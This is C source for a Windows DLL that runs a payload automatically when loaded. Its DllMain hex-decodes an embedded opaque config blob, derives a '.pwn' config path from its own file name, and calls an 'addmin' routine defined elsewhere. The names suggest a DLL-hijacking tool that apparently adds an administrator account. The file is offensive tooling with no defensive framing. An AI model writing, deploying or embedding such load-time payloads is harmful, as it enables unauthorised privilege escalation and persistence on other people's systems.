#include <windows.h>
#include <tchar.h>

#include "../addmin-shared/addmin-shared.h"

#define ADDMIN_FALLBACK_CONFIG

#ifdef ADDMIN_FALLBACK_CONFIG
#include "../addmin-shared/hex.h"
#define CONFIG_DEFAULT "52455a1146bc0e620589a6ca53b3d887668c3a71320800c203dd967eaad3ff08c9827127df2fdedec247e35912289a4f93c6f012ae80632ca39dc0627d0648495902a2d565fad3da824dfc2be50b25a2abaf4c485ff565d941173e8cbd9dedaebf"
#endif


BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved) {
    TCHAR configPath[MAX_PATH];

    #ifdef ADDMIN_FALLBACK_CONFIG
    char fallbackConfig[CONFIG_MAX_SIZE];
    size_t fallbackConfigLen;
    #endif

    switch (ul_reason_for_call) {
    case DLL_PROCESS_ATTACH:
        #ifdef ADDMIN_FALLBACK_CONFIG
        fallbackConfigLen = decodeHex(CONFIG_DEFAULT, sizeof(CONFIG_DEFAULT) - 1, fallbackConfig, sizeof(fallbackConfig));
        #endif  

        GetModuleFileName(hModule, configPath, MAX_PATH);
        size_t len = _tcslen(configPath);
        configPath[len - 3] = 'p';
        configPath[len - 2] = 'w';
        configPath[len - 1] = 'n';

        #ifdef ADDMIN_FALLBACK_CONFIG
        addmin(configPath, fallbackConfig, fallbackConfigLen);
        #else
        addmin(configPath, NULL, 0);
        #endif

        break;        
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

